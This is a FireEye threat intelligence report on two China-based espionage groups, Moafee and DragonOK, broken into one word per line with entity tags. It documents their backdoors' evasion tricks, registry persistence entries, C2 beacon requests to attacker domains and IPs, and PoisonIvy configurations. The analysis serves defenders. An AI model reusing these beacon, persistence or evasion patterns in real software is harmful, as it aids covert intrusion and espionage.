QUANTUM

ENTANGLEMENT

Authors
:
Thoufique
Haq
,

Ned
Moran
,
Sai
Vashisht
,
and
Mike
Scott

FireEye
Labs

SECURITY
REIMAGINED
CONTENTS

Introduction
and
Prior
Research
........................................................................................................................................................................................................................................................3

Attack
Methodology
...........................................................................................................................................................................................................................................................................................................4

Attack
vector
..........................................................................................................................................................................................................................................................................................................................4

Decoy
Behavior
................................................................................................................................................................................................................................................................................................................4

Evasion
Techniques
................................................................................................................................................................................................................................................................................................5

CPU
Core
Check
............................................................................................................................................................................................................................................................................................................5

Password
Protected
Documents
........................................................................................................................................................................................................................................7

Large
files
.........................................................................................................................................................................................................................................................................................................................................8

Backdoor
and
RAT
Tools
............................................................................................................................................................................................................................................................................................9

NewCT
.....................................................................................................................................................................................................................................................................................................................................................9

Nflog B_malware.backdoor
........................................................................................................................................................................................................................................................................................................................................................15

Sysget/HelloBridge  B_malware.backdoor
..........................................................................................................................................................................................................................................................................................17

Mongall
..........................................................................................................................................................................................................................................................................................................................................17

PoisonIvy
.....................................................................................................................................................................................................................................................................................................................................17

Threat
Actor
Attribution
.................................................................................................................................................................................................................................................................................17

Campaign
#1
:
Moafee  B_malware.infosteal
..............................................................................................................................................................................................................................................................................17

Campaign
#2
:
DragonOK  B_malware.infosteal
................................................................................................................................................................................................................................................................19

Acknowledgements
.........................................................................................................................................................................................................................................................................................................20

Appendix
A
:
Python
Routine
to
Decode
NewCT
and
CT
Beacons
....................................................................................................21

Appendix
B
:
Campaign
codes
embedded
in
NewCT/CT  B_malware.backdoor
................................................................................................................................................22

Appendix
C
:
Moafee  B_malware.infosteal
and
DragonOK  B_malware.infosteal
Clusters
.........................................................................................................................................................................................23

In
the
realm
of
quantum
mechanics
,
entanglement
is
a
peculiar
phenomenon
in
which
a
pair
of
particles
takes
on
the
properties
of
each
other
,
regardless
of
the
distance
between
them
.

Albert

Einstein
best
described
this
intertwining
phenomenon
as
'
spooky
action
at
a
distance'1
.

This
behavior
is
analogous
to
the
observed
correlation
between
the
two
geographically
separated
attack
groups
detailed
in
this
paper
.

We
have
uncovered
two
distinct
attack
campaigns
originating
from
different
geographic
regions
in

China
using
similar
tools
,
techniques
and
procedures
(
TTPs
)
.
In
both
campaigns
,
each
attack
group
employed
multiple
overlapping
TTPs
to
infiltrate
their
targets
,
including
similar
custom
built
backdoors
and
remote
administration
tools
(
RATs  B_malware.backdoor
)
such
as
CT/NewCT  B_malware.backdoor
,
Mongall I
and
Nflog B_malware.backdoor
(
and
publicly
available
RATs  B_malware.backdoor
such
as
PoisonIvy
)
to
maintain
access
to
victim
networks
.

We
also
observed
the
use
of
another
custom
backdoor
called
Sysget/HelloBridge  B_malware.backdoor
by
one
of
the
attack
groups
,
which
we
believe
is
possibly
shared
between
the
campaigns
as
well
.

groups
were
also
used
a
well-known
proxy
tool
named
HTRAN
,
which
is
an
abbreviation
for
'
HUC
Packet

Transmit
Tool'2
.
This
tool
proxies
connections
through
intermediate
hops
and
aids
the
attackers
in
disguising
their
true
geographical
location
when
interacting
with
the
victim
networks
.
We
also
observed
both
attack
groups
using
similar
techniques
to
evade
detection
by
security
products
.
In
sum
,
we
believe
that
these
groups
are
from
two
distinct
regions
in
China
and
possibly
(
1
)
are
collaborating
,
(
2
)
received
the
same
training
,
(
3
)
have
a
common
toolkit
supply
chain
,
or
some
combination
of
these
three
.

The
relationship
between
the
two
attack
groups
may
be
direct
or
indirect
,
but
based
on
our
current
visibility
,
they
seem
to
have
two
distinct
missions
,
with
each
one
targeting
different
industries
.
We
were
able
to
ascertain
the
geographical
locations
of
the
two
attack
groups
by
analyzing
their
'
HTRAN
'
infrastructure
over
a
period
of
time
.
We
believe
a
separate
third
group
may
also
be
employing
these
tools
,
but
we
do
not
have
sufficient
insight
in
to
this
additional
group
at
this
time
.

The
attack
group
'
Moafee  B_malware.infosteal
'
(
named
after
their
command
and
control
infrastructure
)
appears
to
operate
out
of
the
Guangdong
province
in

China
and
is
known
to
target
the
governments
and
military
organizations
of
countries
with
national
interests
in
the
South
China
Sea
.

The
seas
in
this
region
have
multiple
claims
of
sovereignty
and
hold
high
significance
,
as
it
is
the
second
busiest
sea-lane
in
the
world3
and
are
known
to
be
rich
in
resources
such
as
rare
earth
metals4
,
crude
oil
,
and
natural
gas5
.

We
have
also
observed
the
Moafee  B_malware.infosteal
group
target
organizations
within
the
US
defense
industrial
base
.

1
http://www.technologyreview.com/view/427174/einsteins-spooky-action-at-a-distance-paradox B_url.unknown
2
http://www.secureworks.com/cyber-threat-intelligence/threats/htran/ B_url.unknown
3
http://en.wikipedia.org/wiki/South_China_Sea#Resources  B_url.unknown
4
http://www.ifri.org/downloads/ifricanonopedseamanecs.pdf  B_url.unknown
5
http://www.eia.gov/countries/regions-topics.cfm?fips=scs  B_url.unknown

The
attack
group
'
DragonOK  B_malware.infosteal
'
(
named
after
an
event
name
in
one
of
their
payload
executables
6
)
appears
to
operate
out
of
the
Jiangsu
province
in
China
,
and
is
known
to
target
high-tech
and
manufacturing
companies
in
Japan
and
Taiwan
.

The
propensity
to
target
these
industries
possibly
demonstrates
an
interest
in
gaining
economic
competitive
advantage
in
the
region
through
the
acquisition
of
trade
secrets
.

using
the
appropriate
language
for
each
of
their
targets
in
the
phishing
emails–
such
as
Japanese
and
traditional
Chinese
(
mainly
used
in
Taiwan
)
.

The
attachments
in
the
email
were
typically
an
executable
file
embedded
in
a
ZIP
archive
or
password-protected
Microsoft
Office
documents
.

One
such
email
,
shown
in
Figure
2
and
used
by
the

DragonOK  B_malware.infosteal
group
was
written
in
traditional

Chinese
,
and
targeted
a
Taiwanese
technology
firm

Attack
Methodology
:

Attack
vector
:

The
primary
observed
attack
vector
used
by
both
groups
is
spear-phishing
emails
.
The
themes--or
topics—used
in
the
emails
from
the
DragonOK  B_malware.infosteal
group
were
well
crafted
and
highly
tailored
to
the
target
audience
.

We
also
found
this
attack
group

Decoy
Behavior

We
observed
both
attack
groups
employ
decoy
documents
in
order
to
help
deceive
potential
victims
.

The
decoy
documents
are
presented
to
the
victim
while
the
malware
runs
in
the
background
.
One
such
Japanese-language
decoy
documents
used
by
the
'
DragonOK  B_malware.infosteal
'
group
is

Figure
1
:

Two
attack
groups
with
common
TTPs

ADVANCED
THREAT

SUPPLY
CHAIN

POSSIBLE
ATTACKER
SUPPLY
CHAIN

OR
TRAINING
REGIMEN

Tools
&
techniques
sharing
centers

Attacker
training
courses

How
Today's

Attacks
are

Manufactured

China

REGIONAL
HIGH-TECH

REGIONAL
MANUFACTURING

Jiangsu

Province

Japan

ATTACK
GROUPS
SEND
MALWARE
,

SPEARPHISHING
EMAILS
,
COMMAND

AND
CONTROL
TO
JAPAN
AND
TAIWAN
,

AS
WELL
AS
THE
REST
OF
THE
WORLD

Advanced
cyber
attack
groups
in
the
world's
largest
manufacturing
country
are
taking
their
expertise
in
supply
chain
economics
to
the
online
world
.
With
a
production
line-like
system
that
enables
joint
attacks
,
the
sharing
of
tools
and
techniques
,
and
unified
training
,
new
threat
actors
and
malware
are
quickly
produced
to
breach
international
and
regional
companies
alike
.

POSSIBLE
SHARING
OF
TOOL

ACROSS
ATTACK
GROUPS

U.S.
DEFENSE

REGIONAL
CONFLICTS

Guangdong

Province

Taiwan
6
http://www.fireeye.com/blog/technical/malware-research/2013/02/hackers-targeting-taiwanese-technology-firm.html B_url.normal

shown
below
.

It
appears
to
be
a
resume
of
someone
from
Kyoto
University
in
Japan
who
was
involved
in
English
language
studies
.

large
file
sizes
,
and
password-protected
documents
–
each
of
which
are
described
in
the
sections
below
.

Evasion
Techniques
:

Both
attack
groups
employ
numerous
,
yet
common
techniques
in
an
attempt
to
evade
detection
by
various
sandbox
environments
,
antivirus
(
AV
)
software
,
and
gateway
firewalls
.
We
observed
environment-based
evasion
,
the
use
of

CPU
Core
Check

The
first-stage
payload
for
RATs  B_malware.backdoor
called
'
CT/NewCT  B_malware.backdoor
'
used
by
both
the
Moafee  B_malware.infosteal
and

DragonOK  B_malware.infosteal
attack
groups
employs
an
evasive
'
CPU
core
check
'
technique
.

The
payload
attempts
to
detect
the
number
of
processor

Figure
2
:

Email
containing
'
888888
'
password
in
body
with
passwordprotected
document
attached

cores
in
the
running
environment
,
by
calling
the
'
GetSystemInfo
'
API
,
which
returns
a
structure
with
system
data
,
including
number
of
cores
.

If
only
one
core
is
detected
,
it
quits
as
seen
in

Figure
5
.

This
probably
is
an
attempt
to
detect
virtualized
environments
such
as
sandboxes
,
as
well
as
other
analysis
environments
used
by
reverse
engineers
,
which
often
tend
to
be
configured
with
a
single
core
.

We
also
observed
a
similar
evasion
technique
within
the
'
Sysget/HelloBridge  B_malware.backdoor
'
payload

Figure
3
:

Example
decoy
document
presented
to
the
victim
during
a

DragonOK  B_malware.infosteal
phishing
attack


Figure
4
:

Structure
returned
by

GetSystemInfo
API

Figure
5
:

Evasion
based
on

CPU
core
detection

employed
by
the
DragonOK  B_malware.infosteal
group
.

It
invokes
a
similar
call
to
'
GetSystemInfo
'
to
determine
the
number
of
active
CPU
cores
,
and
the
code
quits
if
the
system
is
configured
with
only
one
core
.

Password
Protected
Documents
:

The
'
DragonOK  B_malware.infosteal
'
group
in
particular
is
known
to
use
password-protected
documents
delivered
as
attachments
in
emails
,
with
the
password
listed
in
the
contents
of
the
email
.

This
method
probably
is
used
to
evade
detection
by
AV
software
,
gateway
firewalls
and
malware
sandboxes
.

One
such
example
using
the
password
'
888888
'
is
shown
in

Figure
2
and
Figure
6
,
and
has
been
observed
by
FireEye7
before
.

Another
similar
sample
was
referenced
by
the
'
contagio
'
blog8
and
used
the
password
'
8861
'
.
7
http://www.fireeye.com/blog/technical/malware-research/2013/02/hackers-targeting-taiwanese-technology-firm.html B_url.normal
8
http://contagiodump.blogspot.com/2012/08/cve-2012-0158-generated-8861-password.html B_url.normal


Figure
6
:

Password-protected
document

Large
files
:

In
older
phishing
emails
that
link
to
the
tools
used
by
DragonOK  B_malware.infosteal
and
Moafee  B_malware.infosteal
,
we
observed
an
implant
over
10
megabytes
in
size
.

It
was
padded
with
unnecessary
null
bytes
in
the
overlay
section
of
the
file
,
in
order
to
increase
the
file
size
as
shown
in
Figure
7
.
This
probably
was
done
to
evade
detection
,
as
many
hostbased
and
network-based
AV
engines
do
not
have
the
ability
to
scan
large
files
.

Figure
7
:

Large
null
padded
overlay
section

Backdoor
and
RAT B_malware.backdoor
Tools
:

CT/NewCT  B_malware.backdoor

Dropper
:

This
is
a
first
stage
payload
that
drops
and
runs
the

NewCT B_malware.backdoor
implant
.
The
first
stage
payload
(
example
:
46e55cdf507ef10b11d74dad6af8b94e  B_hash
)
attempts
to
detect
the
number
of
CPU
cores
in
the
running
environment
by
calling
GetSystemInfo
as
described
in
the
previous
section
.

If
the
CPU
core
check
detects
more
than
one
core
,
it
implants
the
NewCT2  B_malware.backdoor
RAT B_malware.backdoor
in
%temp%\MSSoap.DLL
(
some
variants
will
use
BurnDCSrv.DLL
and

IntelAMTPP.DLL
)
and
executes
the
written
file
.

The
actual
implant
is
packaged
in
the
resource
section
of
the
dropper
with
a
fake
bitmap
(
BMP
)
header
,
as
shown
in
Figure
8
.

Figure
8
:

DLL
implant
embedded
in
resource
section
with
a
fake
BMP
header

The
implant
also
creates
a
registry
entry
file
called
named
'
Windows.reg
'
and
imports
it
the
contents
of
this
file
into
the
registry
,
using
the
command
:
'
regedit.exe
/s
Windows.reg
'
.

These
registry
entries
ensure
startup
persistence
.

The
contents
of
'
Windows.reg
'
is
populated
based
on
the
Operating
System
(
OS
)
which
is
determined
by
a
call
to
the
GetVersionEx
API
.

Figure
9
:

DLL
implant
embedded
in
resource
section
with
a
fake
BMP
header

BOOL
WINAPI
GetVersionEx(
_Inout_
LPOSVERSIONINFO
lpVersionInfo
typedef
struct
_OSVERSIONINFO
{

DWORD
dwOSVersionInfoSize;

DWORD
dwMajorVersion;

DWORD
dwMinorVersion;

DWORD
dwBuildNumber;

DWORD
dwPlatformId;

TCHAR
szCSDVersion[128];
}
OSVERSIONINFO;

If
'
dwBuildNumber
'
is
equal
to
2
(
VER_

PLATFORM_WIN32_NT
)
and
'
dwMajorVersion
'
is
less
than
6
(
prior
to
Windows
Vista
)
it
adds
following
entry
for
persistence
:
[HKEY_CLASSES_ROOT\CLSID\{fbeb8a05beee-4442-804e-409d6c4515e9}\

InProcServer32]
@='%Temp%\MSSoap.DLL
'

Otherwise
it
creates
a
copy
of
itself
to
%Temp%\

WmiPrvSer.exe
and
creates
the
following
entry
for
persistence
:

HKCU
\Software\Microsoft\Windows\

CurrentVersion\Run\'dllhost
'
=
%Temp%\WmiPrvSer.exe

We
also
found
some
clues
in
the
binary
that
indicate
that
the
tool
was
authored
and
built
by
someone
using
Chinese
fonts
on
their
computer
.

It
contains
resource
strings
in
English
but
the
language
is
set
to
Chinese
as
shown
below
.

Figure
10
:

Embedded
string
table
in
resource
section
with
language
set
to

Chinese

STRINGTABLE

LANGUAGE
LANG_CHINESE
,
0x2
103
,
'
NewCT2  B_malware.backdoor
'
106
,
'
Hello
World
!
'
109
,
'
NewCT2  B_malware.backdoor
'

Implant

The
implant
(
example
:
ccff6e0a6f5e7715bdaf62adf0cbed4f  B_hash
)
is
called
'
NewCT/CT  B_malware.backdoor
'
RAT B_malware.backdoor
.
The
particular
version
we
analyzed
was
NewCT
version
2
.

The
implant
has
persistence
mechanisms
and
contains
functionality
to
perform
command
and
control
communication
.

This
backdoor
also
has
functionality
to
load
additional
plugins
from
the
command
and
control
server
.

It
exports
the
following
two
functions
:

SendData

CreateInstance

It
creates
a
mutex
'
HFRM_
'
to
ensure
there
is
only
one
running
copy
of
the
backdoor
.

It
ensures
this
by
checking
if
the
return
value
from

CreateMutexA
is
183
(
\xB7
)
,
which
corresponds
to
'
ERROR_ALREADY_EXISTS'9
.

The
payload
emits
the
'
POST
'
network
beacon
shown
below
along
with
stub
data
.

The
header
values
are
hardcoded
in
the
payload
,
specifically
the
values
for
'
User-Agent
'
,
'
Cache-Control
'
and
the
bytes
at
offset
0
of
the
stub
(
\xcf\xcf
)
may
be
of
interest
to
network
defenders
.

Figure
11
:

Mutex
usage
and
checks
to
ensure
one
running
copy
9
http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx  B_url.normal

POST
/
HTTP/1.1

Accept-Language
:
en-en

Content-Type
:
application/octetstream

Pragma
:
no-cache

Cache-Control
:
max-age=259200

Connection
:
Close

Content-Length
:
1594

User-Agent
:
Mozilla/4.0
(
compatible;
MSIE
6.0;Windows
NT
5.1
)

Host
:
http.jpaols[.]com\x0d\x0a\
x0d\x0a\xcf\xcf
...

The
POST
stub
contains
encrypted
data
.

The
encrypted
data
has
two
layers
of
abstraction
.

It
is
subjected
to
a
bitwise
NOT
operation
followed
by
encryption
using
a
randomly
generated
4-byte

XOR
key
.

The
data
within
the
POST
stub
is
constructed
in
a
buffer
with
a
header
at
offset
0
(
\
x30\x30
)
followed
by
the
remote
sever
,
remote
port
,
XOR
encrypted
data
and
function
call
location
.

The
function
call
location
is
represented
by
the
textual
values
shown
in
the
table
below
and
is
selected
using
a
switch
case
statement
as
shown
in
Figure
12
.

It
is
used
by
the
attacker
to
track
the
call
path
that
resulted
in
the
network
beacon
.

The

XOR
encrypted
data
contains
the
MAC
Address
,
hostname
and
campaign
code
.

Numeric
Representation

Textual
Representation
index.asp
index.php
index.jsp
index.css
home.asp

Figure
12
:

Call
path
determined
and
embedded
in
network
beacon

To
elucidate
the
encryption
scheme
,
let
us
go
over
a
sample
decryption
process
.

The
Figures
13
and
14
below
shows
data
before
and
after
a
bitwise
NOT
operation
.

In
the
resulting
data
after
NOT
operation
,
the
XOR
key
is
\x30\x30\x34\x31
.

When
applied
to
the
hex
data
following
it
,
we
get
the
decrypted
data
below
,
which
contains
the
MAC
Address
,
hostname
,
and
campaign
code
.

The
Python
routine
to
perform
this
decryption
is
included
in
Appendix
A

We
observed
plugin
functionality
in
the
implant
.

It
has
the
ability
to
load
a
DLL
downloaded
from
the
remote
server
,
and
calls
the
following
export
functions
in
the
DLL
:

Plugin_GetID

Plugin_Init

Plugins_Start

Plugin_End

Figure
13
:

Encrypted
POST
stub

Figure
14
:

POST
stub
after
bitwise
NOT
operation

Figure
15
:

Embedded
XOR
encrypted
data
in

POST
stub

Figure
16
:

DLL
Plugin
functionality
allowing
additional
payloads
to
be
loaded
from
the
server

The
call
graph
for
this
functionality
is
shown
in

Figure
16
.

NewCT B_malware.backdoor
RAT I
evolved
from
older
versions
called
'
CT  B_malware.backdoor
'
,
which
has
been
observed
being
used
in
association
with
the
'
Nflog B_malware.backdoor
'
Backdoor
.

The
following
password-protected
document
(
46ac122183c32858581e95ef40bd31b3  B_hash
)
creates
a
DLL
implant
called
IntelAMTPP.dll
(
ebd1f5e471774bb283de44e121efa3e5  B_hash
)
,
which
is
the
'
CT  B_malware.backdoor
'
RAT B_malware.backdoor
.
In
this
case
,
the
'
CT
'
implant
is
10
MB
in
size
,
as
it
has
padded
null
bytes
at
the
end
of
the
file
to
increase
file
size
in
a
possible
attempt
to
evade
AV
engines
as
described
in
the
previous
section
on
evasion
techniques
.

The
'
CT
'
implant
has
identical
functionality
to
'
NewCT
'
,
as
observed
from
the
embedded
strings
.

00005A58
Connection:close
00005A6C
Cache-Control
:
maxage=259200
00005A8C
Pragma
:
no-cache
00005AA0
Mozilla/4.0
(
compatible;

MSIE
6.0;Windows
NT
5.1
)
00005AD4
Content-Type
:
application/
octet-stream
00005AFC
image/gif
,
image/x-xbitmap
,
image/jpeg
,
image/
pjpeg
,
/
00005B38
Accept-Language
:
en-en
00005B50
%s%02x
00005B5C
home.asp
00005B68
index.css
00005B74
index.jsp
00005B80
index.php
00005B8C
index.asp
00005EFC
ct.datangcun.com
00005F3C
ct.datangcun.com
00005F7C
20120509
00005F8C
CT
V2.1
00006374
Plugin_End
00006380
Plugin_Start
00006390
Plugin_Init
0000639C
Plugin_GetID

This
version
was
called
'
CT
V2.1
'
by
the
author
,
which
may
indicate
that
there
were
other
earlier
versions
of
this
RAT
and
that
it
was
improved
upon
incrementally
.

One
of
the
command
and
control
servers
used
by
a
variant
of
this
implant
is
aptly
named
'
ct.datangcun[.]com
'
.

We
do
not
believe
either
Moafee  B_malware.infosteal
or
DragonOK  B_malware.infosteal
have
controlled
the
domain
'
ct.datangcun[.]
com
'
,
but
it
was
probably
controlled
by
a
third
group
which
also
used
the
implant
in
a
separate
campaign
.

The
network
beacon
for
version
2.1
is
shown
below;
it
uses
the
same
encryption
scheme
as
'
NewCT B_malware.backdoor
'
:

POST
/
HTTP/1.1

Accept-Language
:
en-en

Content-Type
:
application/octet-stream

Pragma
:
no-cache

Cache-Control
:
max-age=259200

Content-Length
:
1572

User-Agent
:
Mozilla/4.0
(
compatible;
MSIE
6.0;Windows
NT
5.1
)

Host
:
ct.datangcun[.]com:1353\x0d\
x0a\x0d\x0a\xcf\xcf

We
also
observed
both
attack
groups
using
campaign
codes
within
this
implant
and
which
are
listed
in
Appendix
B
.

The
campaign
codes
referred
to
victim
countries
,
attack
dates
,
command
and
control
infrastructure
,
and
other
operational
codes
–
which
remain
undeciphered
.

Nflog B_malware.backdoor

We
have
observed
DragonOK  B_malware.infosteal
and
Moafee  B_malware.infosteal
use
the
Nflog B_malware.backdoor
implant I
in
addition
to
an
earlier
version
of
the
NewCT2  B_malware.backdoor
implant I
.

The
password-protected
XLS
document
(
46ac122183c32858581e95ef40bd31b3
)
referenced
earlier
also
drops
an
'
Nflog B_malware.backdoor
'
implant I
(
a3d3b0686e7bd13293ad0e63ebec67af  B_hash
)
in
addition
to
.....
The
'
Nflog B_malware.backdoor
'
implant I
emits
the
following
network
beacon
format
:

POST
/NfLog/Nfile.asp
HTTP/1.1

Accept
:
*/*

User-Agent
:
Mozilla/5.0
(
compatible;
MSIE
7.0;Windows
NT
5.1
)

Host
:

Content-Length
:
0

Cache-Control
:
no-cache

POST
/NfLog/NfStart.asp?ClientId={LocalIP}%20<49d0>%20{ExternalIP}&Nick={Identifier}&dtime=T:8-6-0-53
HTTP/1.1

Accept
:
*/*

Use-Agent
:
Mozilla/4.0
(
compatible;

MSIE
6.0;
Windows
NT
5.0;
.NET
CLR
1.1.4322
)

Host
:

Content-Length
:
36

Cache-Control
:
no-cache

Cookie
:
ASPSESSIONIDACCARCDD=OKNPG-

CKDLEKEHBOHIHLCOMHD

We
have
observed
the
use
of
a
newer
variant
of

Nflog B_malware.backdoor
(
example
:
3eab5e12f99b47e822721e93639ba1d1  B_hash
)
being
employed
in
attacks
,
which
has
the
beacon
format
shown
below
:

POST
/windowsxp/SNews.asp?HostID={-

MAC
Address}
HTTP/1.1

Accept
:
/

Cache-Control
:
no-cache

User-Agent
:
Mozilla/4.0
(
compatible;
MSIE
6.0;
Windows
NT
5.0;
.NET

CLR
1.1.4322
)

Host
:

Content-Length
:
126

Connection
:
Close

Cookie
:
ASPSESSIONIDAARSSTTB=ECD-

DKIAAOHGODEKKFGOKNJCD

Other
URI
formats
it
uses
are
as
follows
:
/windowsxp/SSports.asp?HostID=
/windowsxp/SWeather.asp?HostID=
/windowsxp/SJobs.asp?HostID=
/windowsxp/STravel.asp?HostID=
/windowsxp/NfHostInfo.asp?NickId=
/windowsxp/SGames.asp?HostID=

Note
the
same
User-Agent
'
Mozilla/4.0
(
compatible;
MSIE
6.0;
Windows
NT
5.0;
.NET
CLR
1.1.4322
)
'
is
used
by
both

the
older
and
newer
version
of
'
Nflog B_malware.backdoor
'
samples
.

We
also
found
code-level
similarities
in
the
network
communication
function
code
,
as
well
as
the
data
collection
function
code
shown
in
Figure
17
.

This
strongly
suggests
that
it
is
an
updated
version
of
the
'
Nflog B_malware.backdoor
'
backdoor
.

Figure
17
:

Identical
data
collection
function
seen
in
both
older
and
newer
Nflog B_malware.backdoor
variants

Sysget/HelloBridge  B_malware.backdoor

This
tool
has
recently
been
analyzed
by
Secureworks
10
.

We
observed
the
DragonOK  B_malware.infosteal
attacker
employ
this
tool
against
targets
in
Japan
and

Taiwan
(
e.g.
57e3d002542e07f2eb09fd2b1b0eeab2  B_hash
)
,
as
also
noted
by
Secureworks
.

We
have
not
yet
seen
the
Moafee  B_malware.infosteal
group
use
this
tool
.

This
implant
has
the
following
beacon
format
:

GET
/el/sregister.php?name=[REDACTED]

HTTP/1.1

User-Agent
:
Mozilla/5.0
(
compatible;
MSIE
10.0;

Windows
NT
6.1;
Trident/6.0
)

Host
:
122.10.62.137 B_url.normal

Connection
:
Keep-Alive

Other
URI
formats
include
:
/el/slogin.php?uid=
/el/suploadfile.php?item=
/el/suploadfile.php

Mongall

FireEye
has
previously
analyzed
this
backdoor11
,
which
is
used
by
multiple
other
groups
in
addition
to
DragonOK  B_malware.infosteal
and
Moafee  B_malware.infosteal
.
DragonOK  B_malware.infosteal
in
particular
is
known
to
frequently
use
this
implant
(
e.g.
e8d77d19e1c6f462f4a5bf6fbe673a3c  B_hash
)
,
which
has
the
following
network
beacon
format
:

GET
/3000FC080000[REDACTED
00000000
0000000000000000000000000000000000
0000000000000000000000000000000000
0000000000000000000000000000000000
00100000[REDACTED]0000000000000000
000000000000000000000000000000000
0
0000000000000000[REDACTED]000000

HTTP/1.1
User-Agent
:
Mozilla/4.0
(
compatible;
MSIE
7.0;
Windows
NT
6.1;
WOW64;
Trident/6.0;
SLCC2;
.NET
CLR
2.0.50727;
.NET
CLR
3.5.30729;
.NET
CLR
3.0.30729;

Media
Center
PC
6.0
)

Host
:
mail.jpaols[.]com:443

Cache-Control
:
no-cache

PoisonIvy

This
is
a
publicly
available
RAT
used
by
multiple
threat
actors
,
which
has
been
extensively
analyzed
in
a
previous
FireEye
white
paper12
.

The
extracted
configuration
blocks
from
a
'
DragonOK  B_malware.infosteal
'

PoisonIvy
variant
(
65fcc9b9ff608801edc697552438cfee  B_hash
)
,
is
shown
below
:

ID
:
ftp

Domains
:
ftp.skydnastwm.com:15836| B_url.unknown

Password
:
Ecp982*@Me2

Mutex
:
fftp

In
contrast
,
here
is
an
extracted
PoisonIvy
configuration
block
from
a
'
Moafee  B_malware.infosteal
'
instance
(
9ebe86a648b1f19836251f946a160b16  B_hash
)
,
as
shown
below
:

Domains
:
afp.mozjlla.com|

Password
:
741526

Mutex
:
)!afpA.I4

Threat
Actor
Attribution

Campaign
#1
:
Moafee  B_malware.infosteal

We
have
observed
the
Moafee  B_malware.infosteal
group
target
the
governments
and
militaries
of
countries
with
national
interests
in
the
South
China
Sea
.

We
have
also
observed
this
group
target
companies
within
the
US
defense
industrial
base
.

As
discussed
,
we
have
observed
the
Moafee  B_malware.infosteal
group
use
a
number
of
different
tools
including
Poison

Ivy
,
Nflog B_malware.backdoor
,
Mongall
,
and
NewCT2  B_malware.backdoor
.

We
found
this
group
running
HTRAN
on
one
of
their
front-end
command
and
control
servers
.
The
command
and
control
server
in
question
was
10
http://www.secureworks.com/resources/blog/research/hellobridge-trojan-uses-heartbleed-news-to-lure-victims/ B_url.normal
11
http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-ofmalaysian-flight-mh-370.html B_url.normal
12
http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf B_url.normal
13
http://en.wikipedia.org/wiki/South_China_Sea#Resources  B_url.normal
14
http://www.ifri.org/downloads/ifricanonopedseamanecs.pdf  B_url.normal
15
http://www.eia.gov/countries/regions-topics.cfm?fips=scs  B_url.normal

located
at
58.64.201.229 B_ip.normal
.

We
monitored
this
server
for
two
months
,
from
January
to
March
this
year
.

During
this
time
period
,
we
observed
the
following
domains
resolving
to
58.64.201.229 B_ip.normal
:
ph.moafee[.]com B_url.unknown
afp.mozjlla[.]com B_url.unknown
mofa.mozjlla[.]com  B_url.unknown
acer.moafee[.]com B_url.unknown
del.moafee[.]com  B_url.unknown
jnt.moafee[.]com  B_url.unknown
pcg.moafee[.]com  B_url.unknown
sslc.moafee[.]com B_url.unknown
at.moafee[.]com B_url.unknown
lw.moafee[.]com B_url.unknown
ks.moafee[.]com B_url.unknown
oa.moafee[.]com B_url.unknown
xxpp.moafee[.]com B_url.unknown
hp.moafee[.]com B_url.unknown
gumm.mozjlla[.]com  B_url.unknown
msn.moafee[.]com  B_url.unknown

During
this
same
time
frame
,
the
HTRAN
client
at
58.64.201.229 B_ip.normal
was
observed
attempting
to
connect
to
a
number
of
different
backend
HTRAN
servers
.

All
of
these
HTRAN
servers
were
located
in
the
Guangdong

Province
and
operated
by
CHINANET
.

Additionally
,
the
Moafee  B_malware.infosteal
group
also
hosted
a

PoisonIvy
command
and
control
server
at
phi
.
crabdance[.]com B_url.unknown
.
Between
April
30
,
2012

DATE
2014-03-15
2014-03-02
2014-02-22
2014-02-18
2014-02-15
2014-02-12
2014-02-02
2014-01-30
2014-01-27
2014-01-25
2014-01-20
2014-01-15

HTRAN
Backend
58.64.201.229 B_ip.unknown
58.64.201.229 B_ip.unknown
58.64.201.229 B_ip.unknown
58.64.201.229 B_ip.unknown
169.254.163.19  B_ip.unknown
113.65.22.148 B_ip.unknown
169.254.61.191  B_ip.unknown
113.68.111.111  B_ip.unknown
58.64.201.229 B_ip.unknown
113.68.108.62 B_ip.unknown
58.64.201.229 B_ip.unknown
58.64.201.229 B_ip.unknown
58.64.201.229 B_ip.unknown
113.68.168.73 B_ip.unknown
169.254.92.25 B_ip.unknown
113.65.43.42  B_ip.unknown
58.64.201.229 B_ip.unknown
113.66.12.112 B_ip.unknown
58.64.201.229 B_ip.unknown
113.65.41.28  B_ip.unknown
58.64.201.229 B_ip.unknown
113.68.171.67 B_ip.unknown
58.64.201.229 B_ip.unknown
113.68.110.239  B_ip.unknown

HTRAN
Backend

Geolocation

LINK
LOCAL

CHINANET
GUANGDONG

PROVINCE
NETWORK

LINK
LOCAL

CHINANET
GUANGDONG

PROVINCE
NETWORK

CHINANET
GUANGDONG

PROVINCE
NETWORK

CHINANET
GUANGDONG

PROVINCE
NETWORK

LINK
LOCAL

CHINANET
GUANGDONG

PROVINCE
NETWORK

CHINANET
GUANGDONG

PROVINCE
NETWORK

CHINANET
GUANGDONG

PROVINCE
NETWORK

CHINANET
GUANGDONG

PROVINCE
NETWORK

CHINANET
GUANGDONG

PROVINCE
NETWORK
13
http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-ofmalaysian-flight-mh-370.html B_url.normal
12
http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf B_url.normal

and
July
1
,
2012
,
the
phi.crabance[.]com
domain
resolved
to
98.126.91.66  B_ip.unknown
.

This
IP
was
observed
hosting
a
HTRAN
proxy
client
,
which
was
seen
connecting
to
a
backend
HTRAN
server
hosted
at
113.66.248.60  B_ip.unknown
.

This
server
was
also
located
in
the
Guangdong
Province
and
operated
by
CHINANET
.

In
short
,
the
Moafee  B_malware.infosteal
group
was
observed
consistently
hosting
their
backend
HTRAN
servers
in
Guangdong
.

This
observation
may
reveal
that
the
Moafee  B_malware.infosteal
group
is
physically
located
in
this
province
.

Campaign
#2
:
DragonOK  B_malware.infosteal

We
have
observed
the
DragonOK  B_malware.infosteal
group
target
high-technology
and
manufacturing
companies
in
both
Japan
and
Taiwan
.

This
group
has
used
similar
malware
to
the
Moafee  B_malware.infosteal
group
described
above
.

Specifically
,
we
observed
DragonOK  B_malware.infosteal
employing
PoisonIvy
,

Nflog B_malware.backdoor
,
Mongall
,
CT
,
and
NewCT
.

Like
the
Moafee  B_malware.infosteal
group
,
we
observed
the

DragonOK  B_malware.infosteal
group
running
an
HTRAN
proxy
client
on
one
of
their
front-end
command
and
control
servers
.

For
approximately
one
week
,
between
July
31
,
